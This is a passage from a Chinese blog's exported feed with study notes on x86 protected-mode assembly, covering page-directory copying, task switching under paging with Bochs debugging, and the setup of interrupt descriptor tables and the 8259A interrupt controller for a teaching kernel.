class="assembly">create_copy_cur_pdir;创建新页目录，并复制当前页目录内容                      ;输入：无                          ;输出：EAX=新页目录的物理地址    push ds    push es    push esi    push edi    push ebx    push ecx        mov ebx,mem_0_4_gb_seg_sel     ;指向4G字节的段，为访问两个    mov ds,ebx                     ;页目录表做准备    mov es,ebx        call allocate_a_4k_page    mov ebx,eax;EAX时这个页的基地址    or ebx,0x00000007    mov [0xfffffff8],ebx        invlpg [0xfffffff8];刷新处理器的TLB中的条目                            ;这个页目录项位于内核任务的页目录表中                             ;每当我们创建一个新的用户任务时，都用它来指向新任务的页目录表                            ;修改这个表项时，修改的是内存中的，其在TLB中还有一个缓存                            ;这个缓存的内容通常指向上一个任务的页目录表，因为我们在反复创建新任务                            ;所以需要强制刷新这个缓存，与当前内存中的表项保持一致                                mov esi,0xfffff000;ESI-&gt;当前页目录的线性地址    mov edi,0xffffe000;EDI-&gt;新页目录的线性地址    mov ecx,1024;ECX=要复制的目录项数    cld;传送方向为正，从底到高    repe movsd     ;需要使用两个段寄存器                            ;movsd表示每次传送一个字                            ;源操作数位于DS、目的操作数位于ES中        pop ecx    pop ebx    pop edi    pop esi    pop es    pop ds        retf</code></pre><p>为了能访问到这个4K字节页，把其物理地址登记到当前页目录表的倒数第二个表项中，即表内偏移<strong>0xFF8</strong>地址处。这个表项的线性地址为：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/86a5e81c6f38a69aa6a7f214ed2c8fd9-166833015581971.png" class=""><p>所以程序中，将附加了属性的页地址登记到这个线性地址处<strong>mov [0xfffffff8], ebx</strong>。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/70d154c87cbdd47bdabab6d6f7a1f256-166833015581972.png" class=""><p>其中指令<strong>invlpg(Invalidate TLB Entry)<strong>用于刷新</strong>TLB</strong>中的单个条目。<strong>TLB</strong>是一个附加的硬件机构，只有处理器正常访问内存时才会导致它的填充和更新。</p><p>这条指令是特权指令，在保护模式下执行的特权级必须是0，此指令不影响任何标志位。</p><p>为什么新页目录表的线性地址是<strong>0xFFFFE000</strong>呢？</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/944f6f04ee6e0be26a785c13e719da30-166833015581973.png" class=""><h2 id="28-第二个用户任务的创建和分页模式下的任务切换"><a href="#28-第二个用户任务的创建和分页模式下的任务切换" class="headerlink" title="28. 第二个用户任务的创建和分页模式下的任务切换"></a>28. 第二个用户任务的创建和分页模式下的任务切换</h2><p>在加载和创建用户任务之后，处于就绪状态，随时可以执行。在本章中任务切换是自动进行的，是由一个实时时钟信号驱动的，时钟芯片每秒钟发出一个中断信号，中断发生时处理器执行设置好的中断处理过程。这个中断处理过程就用于执行任务切换。</p><p>中断处理过程就是<strong>rtm_0x70_interrupt_handle</strong>例程，调用<strong>initiate_task_switch</strong>从<strong>TCB</strong>链表中找到当前状态为忙的任务将其状态改为就绪、再找到后面第一个就绪的任务将其状态设置为忙，切换任务执行。</p><p>一旦内核任务重新执行时，将执行后续指令：</p><pre><code class="assembly">    push dword 50                      ;用户程序位于逻辑50扇区    push ecx                           ;压入任务控制块起始线性地址     call load_relocate_program    call append_to_tcb_link            ;将此TCB添加到TCB链中                                        ;此时有2个任务轮流执行            ;可以创建更多的任务，例如：    mov ecx,0x4a    call sys_routine_seg_sel:allocate_memory    mov word [es:ecx+0x04],0           ;任务状态：空闲    mov dword [es:ecx+0x46],0          ;任务内可用于分配的初始线性地址        push dword 100                     ;用户程序位于逻辑100扇区    push ecx                           ;压入任务控制块起始线性地址        call load_relocate_program    call append_to_tcb_link            ;将此TCB添加到TCB链中                                        ;此时有2个任务轮流执行    .do_switch:    mov ebx,core_msg2    call sys_routine_seg_sel:put_string        ;清理已经终止的任务，并回收它们占用的资源    call sys_routine_seg_sel:do_task_clean        hlt;停机之后，任何时候发生中断                ;处理器将会被唤醒继续执行任务切换        jmp .do_switch</code></pre><p>用户程序和上一章相同：<strong>用户程序1</strong>打印<strong>，，，，，，…<strong>、</strong>用户程序2</strong>打印<strong>cccccc…</strong></p><pre><code class="assembly">SECTION code vstart=0start:    ;任务启动时，DS指向头部段，也不需要设置堆栈     mov eax,ds    mov fs,eax        mov ax,[data_seg]    mov ds,ax    .do_prn:    mov ebx,message_1    call far [fs:PrintString]    jmp .do_prn        call far [fs:TerminateProgram]      ;退出，并将控制权返回到核心     code_end:</code></pre><h2 id="29-分页模式下多任务切换的演示和调试"><a href="#29-分页模式下多任务切换的演示和调试" class="headerlink" title="29. 分页模式下多任务切换的演示和调试"></a>29. 分页模式下多任务切换的演示和调试</h2><p>加载程序：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/dd6b2d1cf65101ab1157fdbf959c2e12-166833015581974.png" class=""><p><strong>Virtual Box</strong>虚拟机：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/7c427b058ef8287c6591c609d62a8c86-166833015581975.png" class=""><p><strong>Bochs</strong>虚拟机：<br>设置断点：<mark>b 0x7c00</mark><br>执行：<mark>c</mark><br>设置断点：<mark>modebp</mark>，会在模式切换时停下<br>设置断点在进入内核的时候：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/bc66e79cf2decf543a4c0de3902f257b-166833015581976.png" class=""><p>设置断点在创建第一个用户程序之前：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/2abbb8cf38ef0b7bc71cb4ff85c61f1c-166833015581977.png" class=""><p>当前分页功能是关闭的：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/151a3202b0f470cfe608ee6cdc4f0e55-166833015581978.png" class=""><p>执行到创建第一个用户程序这个断点之前：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/87d023f2b13c30f6f0248ee085d7f933-166833015581979.png" class=""><p><strong>page</strong>命令解析线性地址是如何映射的：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/2d207c40d4ed4aad351b0574c350c05c-166833015581980.png" class=""><ul><li><strong>PDE行</strong>：第一行是该线性地址在页目录表中对应的表项，该表项填写了该线性地址对应页表的物理地址是<strong>0x21000</strong>，后面的<strong>023</strong>是属性信息，大写是1、小写是0</li><li><strong>PTE行</strong>：第二行是该线性地址在页表内的登记项，页的物理地址是0、属性信息是3</li><li>从这两行直到线性地址中<strong>0</strong>对应的物理地址也是<strong>0</strong></li></ul><p>再看一下高端线性地址的对应：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/2232d584b1105c1c111a6d24dc4232bc-166833015581981.png" class=""><ul><li>页表物理地址是<strong>0x21000</strong></li><li>这个物理页对应的物理页地址为<strong>0</strong>，之前把内核从低端映射到高端，那么这个地址就是高端的起始地址</li></ul><p>进入例程<strong>load_relocate_program</strong>：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/93f55c2f8dc74acbb1ea7606ee60f989-166833015581982.png" class=""><p>设置断点在<strong>ret 8</strong>处：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/4cefb3a82b2456df50beb419a43bd04c-166833015581983.png" class=""><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/08d72b71dd46721eaa0f9158add23515-166833015581984.png" class=""><p>前面是内核任务为用户任务设置的地址对应关系。</p><p>此时用户任务的线性地址<strong>0</strong>被映射为<strong>0x35000</strong>：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/2485ee1c3461410a66d0c7eef09f5509-166833015581985.png" class=""><p><strong>blist</strong>命令查看设置过的断点信息：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/587119267467e85e47a9d50f2273e939-166833015581986.png" class=""><p>第二个任务创建之后，线性地址<strong>0</strong>被映射为<strong>0x101000</strong></p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/f52abfb2fbdea7ddf2b8763e5a182598-166833015581987.png" class=""><p>即对于不同的线性地址会被映射到不同的页中，其物理地址是不同的。</p><p>执行信息：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/image-20221113170249308.png" class="" title="image-20221113170249308">]]></content>
      
      
      <categories>
          
          <category> Windows保护模式 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>30-中断和异常的处理与抢占式多任务</title>
      <link href="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/"/>
      <url>/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-中断和异常概述"><a href="#1-中断和异常概述" class="headerlink" title="1. 中断和异常概述"></a>1. 中断和异常概述</h2><p>协同式任务切换不一定要通过一个专门的接口例程进行，也可以用一般的例程进行。</p><span id="more"></span><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/fe53f291cfd54bdb4ff39df4c2a88337.png" class=""><p>用户任务通过调用门切换到内核的<strong>put_string</strong>例程执行，在内核任务返回用户任务之前可以进行任务切换，之后再通过<strong>retf</strong>返回用户任务执行。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/0541841212d9120d7adc89707c464bc7.png" class=""><ul><li>硬件中断信号，<mark>NMI</mark>是不可屏蔽中断、<mark>INTR</mark>是来自硬件中断引脚的可屏蔽中断。随机产生，与处理器是异步的。</li><li>软件中断，<mark>INT N</mark>是在软件内部主动引发的中断。</li><li>处理异常中断（Exceptions），是处理器内部产生的中断，表示处理器执行时产生了错误的状况。比如当处理器执行一条非法指令或者因条件不具备指令不能正常执行时将会引发这种类型的中断。如<mark>div指令</mark>中<mark>除数是0</mark>的情况。<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/e083d1c54d9b807af3a4d71568db31b6.png" class="">终端和异常<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/9f6e794666998a02b19d053418864147.png" class="">按照异常的产生原因分类：<ol><li>指令执行异常：处理器在执行指令时检测到程序的错误并由此而引发的异常</li><li>程序调试异常：供调试器使用，由<mark>INTO、INT3</mark>主动发起。用来检查特定的机器状态是否出现。<mark>INTO</mark>检查标志寄存器的<mark>OF=1</mark>（溢出标志位）则执行指令引发异常中断。<strong>INT3</strong>指令由调试器单步执行使用。</li><li>机器检查异常：和处理器架构有关，如在奔腾4、P6处理器家族上就实现了机器检查架构，用这种异常检测与硬件有关的总线错误、奇偶校验错误、高速缓存错误等等。</li></ol></li></ul><p>根据异常的性质和严重性分类：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/a1aab83b38172cd0c1405bb831af0706.png" class=""><ol><li>故障（Faults）：通常可以纠正，如缺页异常。中断程序返回的是当前指令。</li><li>陷阱（Traps）：通常是在执行了截获陷阱条件的指令之后立即产生，通常用于调试<mark>INT3、INTO</mark>。中断程序返回的是当前指令的下一条指令。</li><li>终止（Aborts）：通常标志最严重的错误，如硬件错误、系统表错误（如GDT、LDT数据不一致、无效、错误），这类异常一般无法精确的报告引起错误的指令的位置。发生时程序和错误都不可能重新启动，双重异常（当处理器发生异常时，在转入异常执行时又发生了另一个异常）如中断向量号18，<mark>INT 0x18</mark>。</li></ol><p>对于某些异常来说，处理器再转入异常处理程序之前，会在栈中压入一个称为错误代码的数值，这样可以帮助诊断异常产生的位置和原因。</p><h2 id="02-保护模式下中断和异常的向量分配"><a href="#02-保护模式下中断和异常的向量分配" class="headerlink" title="02. 保护模式下中断和异常的向量分配"></a>02. 保护模式下中断和异常的向量分配</h2><p>终端和异常的编号叫做中断向量。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/826b6014ebc1fb0f05fc99bdb31944d1.png" class=""><p>其中错误代码是在中断发生时，在进入中断处理程序之前压在栈中的错误代码。</p><h2 id="03-中断描述符、中断门和陷阱门"><a href="#03-中断描述符、中断门和陷阱门" class="headerlink" title="03. 中断描述符、中断门和陷阱门"></a>03. 中断描述符、中断门和陷阱门</h2><p>实模式下的中断向量表：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/70cbd9f6d7a234ea6667922d43c27f20.png" class=""><p>中断发生时，处理器要么自发产生一个中断向量、要么从软中断指令的操作数到中断向量、或者从从外部的中断控制器取得一个中断向量。将该向量作为索引访问中断向量表<strong>IVT</strong>，具体做法是将中断向量乘以4作为偏移量访问<strong>IVT</strong>，从中取得中断处理过程的段地址和偏移地址，并转到那里执行。</p><p>保护模式下：使用中断描述符表<strong>IDT</strong>（Interrupt Descriptor Table），保存和中断处理过程相关的描述符，包括中断门、陷阱门、任务门，门是特殊的描述符。</p><p><mark>中断门</mark>描述符用来描述中断处理过程。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/05b1c6c1d0dcb160102e0248a536feca.png" class=""><p><mark>陷阱门</mark>描述符用来描述陷阱中断的处理过程。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/506f1a49cbf434b592d7810c41d99dfc.png" class=""><p>任务门，32位处理器支持，若<strong>IDT</strong>中描述的是一个任务门，则执行的是一个任务切换。在64位处理器中既不支持硬件切换也不支持任务门。</p><p>实模式下的中断向量表<strong>IVT</strong>只能位于内存的最低端。保护模式下的中断描述符表<strong>IDT</strong>可以位于内存的任何位置。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/7957d4bde64a8c498450b215e31de922.png" class=""><p><strong>IDT</strong>的第一个描述符，即<mark>0号槽位</mark>也是有效的。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/f0ce0cd6d25a0616bf8bbf347dbf1802.png" class=""><ul><li>处理器用中断向量乘以8得到表内偏移，联合<strong>IDTR</strong>内的<strong>IDT</strong>基地址去访问内存；</li><li>从中取得<strong>中断门</strong>或<strong>陷阱门</strong>描述符；</li><li>在描述符中有中断处理过程的<strong>代码段选择子</strong>和<strong>段内偏移量</strong>；</li><li>取决于代码段选择子的<strong>TI位</strong>，去<strong>GDT</strong>或<strong>LDT</strong>中取得目标代码段的描述符；</li><li>从目标代码段的描述符中取得目标代码段的段基地址；</li><li>将<strong>段基地址</strong>和<strong>偏移量</strong>相加得到中断处理过程的的线性地址，从而转移执行。</li></ul><p>使用中断向量访问<strong>IDT</strong>时，中断向量超过<strong>IDT</strong>界限值时，就会产生常规保护异常**#GP**。</p><h2 id="04-本章程序介绍"><a href="#04-本章程序介绍" class="headerlink" title="04. 本章程序介绍"></a>04. 本章程序介绍</h2><p>引导程序：<mark>c13_mbr0.asm</mark></p><ol><li>取出<strong>GDT</strong>所在线性基地址</li><li>创建本程序相关描述符，接着使用<strong>cli</strong>指令关闭中断响应</li><li>进入保护模式</li><li>加载内核代码到内存中</li><li>创建内核相关的描述符</li><li>跳转执行内核</li></ol><p>内核程序：<mark>c30_core0.asm</mark></p><ol><li>创建各个段的选择子常量和<strong>IDT</strong>线性地址</li><li>内核头部段</li><li>内核公共例程段，除了之前创建的相关例程，本章增加了几个和中断相关的例程</li><li>内核核心数据段，各种数据</li><li>内核核心代码，改变了内核入口点<strong>start</strong>的程序。</li></ol><p>用户程序0：<mark>c30_app0.asm</mark><br>其他不变，死循环打印<mark>，，，，，，</mark></p><p>用户程序1：<mark>c30_app1.asm</mark><br>其他不变，死循环打印<mark>cccccc</mark></p><h2 id="05-创建并安装全部的256个中断门"><a href="#05-创建并安装全部的256个中断门" class="headerlink" title="05. 创建并安装全部的256个中断门"></a>05. 创建并安装全部的256个中断门</h2><p>在进入内核<mark>start</mark>之后，准备创建内核任务、用户任务并进行任务切换，在此之前需要准备好保护模式下的中断系统。</p><p>中断或异常发生时，并不是直接调用中断或异常处理程序，而是用中断向量先到中断描述符中寻找对应的中断描述符，即中断门或陷阱门，之后从中断门或陷阱门中间接找到中断处理过程。意味着必须为这个通用的中断处理过程创建中断门或陷阱门，并安装在中断描述符表<mark>IDT</mark>中。</p><p>创建中断门代码如下：</p><pre><code class="assembly">    ;前20个向量是处理器异常使用的    mov eax,general_exception_handler  ;门代码在段内偏移地址    mov bx,sys_routine_seg_sel         ;门代码所在段的选择子    mov cx,0x8e00                      ;32位中断门，0特权级    call sys_routine_seg_sel:make_gate_descriptor</code></pre><p>中断门属性值<mark>8E00</mark>：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/d24b99343349d21cb8e624e9d7860a1d.png" class=""><p>创建好之后需要安装在中断描述符表<strong>IDT</strong>中，<strong>IDT</strong>现在还没有创建，创建<strong>IDT</strong>就是指定表的起始线性基地址，并从这个地址安装中断门和陷阱门就可以了。</p><p>目前系统内存布局：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/b9132c903725144ad56a81ec7e391e95.png" class=""><p>依次安装中断门或陷阱门：前20个中断门指向通用处理过程<strong>general_exception_handler</strong>。</p><pre><code class="assembly">    mov ebx,idt_linear_address         ;中断描述符表的线性地址    xor esi,esi.idt0:    mov [es:ebx+esi*8],eax;基址变址寻址    mov [es:ebx+esi*8+4],edx    inc esi    cmp esi,19                         ;安装前20个异常中断处理过程    jle .idt0</code></pre><p>之后安装通过的中断门：后236个中断门都指向同一个中断处理程序<strong>general_interrupt_handler</strong>。</p><pre><code class="assembly">    ;其余为保留或硬件使用的中断向量    mov eax,general_interrupt_handler  ;门代码在段内偏移地址    mov bx,sys_routine_seg_sel         ;门代码所在段的选择子    mov cx,0x8e00                      ;32位中断门，0特权级    call sys_routine_seg_sel:make_gate_descriptor        mov ebx,idt_linear_address         ;中断描述符表的线性地址.idt1:    mov [es:ebx+esi*8],eax    mov [es:ebx+esi*8+4],edx    inc esi    cmp esi,255                        ;安装普通的中断处理过程    jle .idt1</code></pre><h2 id="06-为实时时钟中断创建和安装中断门"><a href="#06-为实时时钟中断创建和安装中断门" class="headerlink" title="06. 为实时时钟中断创建和安装中断门"></a>06. 为实时时钟中断创建和安装中断门</h2><p>使用实时时钟中断，默认中断号<strong>0x70</strong>，当发生<strong>0x70</strong>号中断时并不是执行一个通用的中断过程，而是执行它自己的中断处理过程<strong>rtm_0x70_interrupt_handle</strong>。</p><p>现在需要创建<strong>0x70</strong>号中断的中断门，并安装在中断描述符表中，用来替换原来的通用中断门。</p><pre><code class="assembly">    ;设置实时时钟中断处理过程    mov eax,rtm_0x70_interrupt_handle  ;门代码在段内偏移地址    mov bx,sys_routine_seg_sel         ;门代码所在段的选择子    mov cx,0x8e00                      ;32位中断门，0特权级    call sys_routine_seg_sel:make_gate_descriptor        mov ebx,idt_linear_address         ;中断描述符表的线性地址    mov [es:ebx+0x70*8],eax    mov [es:ebx+0x70*8+4],edx</code></pre><h2 id="07-加载中断描述符表寄存器IDTR"><a href="#07-加载中断描述符表寄存器IDTR" class="headerlink" title="07. 加载中断描述符表寄存器IDTR"></a>07. 加载中断描述符表寄存器IDTR</h2><p>接上一节，现在已经在中断描述符表中安装了256个中断门，除了<strong>0x70</strong>号中断，其它都指向默认的中断或异常处理程序。</p><p>当中断发生时，处理器如何找到中断描述符表呢？处理器中有一个中断描述符表寄存器<strong>IDTR</strong>，保存着中断描述符表<strong>IDT</strong>的线性基地址以及长度。现在应该将<strong>IDT</strong>的基地址和界限值加载到<strong>IDTR</strong>中。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/99bae412d7ff952cfc8225cb8b0a28ea.png" class=""><p>偏移为<em>m</em>的地方开辟出6个字节的空间。前2个字节保存<strong>IDT</strong>的界限值，后4字节保存着<strong>IDT</strong>的线性基地址。执行此条指令时，处理器用段寄存器中的线性基地址加上指令中的<strong>偏移m</strong>构成物理地址访问内存取出这6个字节。然后传送到处理器内部的<strong>IDTR</strong>寄存器中。该指令在实模式下也能执行。</p><p>开机时，<strong>IDTR</strong>中基地址被初始化为<strong>0x00000000</strong>，界限值被初始化为<strong>0xFFFF</strong>。<strong>lidt</strong>指令不影响任何标志位。代码如下：</p><pre><code class="assembly">    ;准备开放中断    mov word [pidt],256*8-1            ;IDT的界限    mov dword [pidt+2],idt_linear_address    lidt [pidt]                        ;加载中断描述符表寄存器IDTR</code></pre><h2 id="08-重新设置8259A主片的中断向量"><a href="#08-重新设置8259A主片的中断向量" class="headerlink" title="08. 重新设置8259A主片的中断向量"></a>08. 重新设置8259A主片的中断向量</h2><p>接上一节，理论上此时就可以开放中断，对到来的中断进行处理。但是还有一个问题，若中断控制器芯片还是8259A，就需要对其重新初始化。</p><p><strong>BIOS</strong>会将<strong>8259A</strong>主片中断号设置为如下，基本输入输出系统会将从片中段号设置为如下：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/0faf013194812787745b38e3d79ad29e.png" class=""><p>由于主片中断向量和异常的中断向量冲突，所以需要重新初始化中断向量。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/bb3507b237ba7570270d16a6f6990d84.png" class=""><p>修改为后面的中断向量：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/8a32fa7cbcfac5aed5d3a2f92dcd4962.png" class=""><p>对<strong>8259A</strong>编程需要使用初始化命令字<strong>ICW</strong>。共4个，都是单字节命令，不是单独发送的，而是按顺序全部发送一遍，<strong>ICW1~ICW4</strong>，发送哪个取决于<strong>ICW1</strong>、<strong>ICW2</strong>的内容，可能<strong>ICW3</strong>、<strong>ICW4</strong>不需要发送。</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/1b3a44f5f57993fa3fde845ab5e753fe.png" class=""><p>对于主片来说先向<strong>0x20</strong>号端口发送<strong>ICW1</strong>，对于从片来说要向<strong>0xA0</strong>号端口发送<strong>ICW1</strong>，<strong>ICW1</strong>是一个标志，每次<strong>8259A</strong>芯片接收到<strong>ICW1</strong>表示一个新的初始化过程开始了。</p><p>从<strong>0x20、0xA0</strong>接收到<strong>ICW1</strong>后，<strong>8259A</strong>期待从<strong>0x21、0xA0</strong>接收<strong>ICW2</strong>，后续是否期待<strong>ICW3、ICW4</strong>要看<strong>ICW1</strong>的内容。<strong>ICW1</strong>发送给<strong>0x20、0xA0</strong>号端口作为标志，之后<strong>ICW2、ICW3、ICW4</strong>会发送给<strong>0x21、0xA1</strong>号端口。</p><p><mark>ICW1</mark>：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/f91758bee251fd8220e7de9497bcc1d7.png" class=""><p><mark>ICW2</mark>：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/511bc7af4ee3bcacd4ac5eae71ef3a8b.png" class=""><p><mark>ICW3</mark>：</p><img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/13779e943bef875df248803639068b0e.png" class=""><p><mark>ICW4</mark>：</p><img 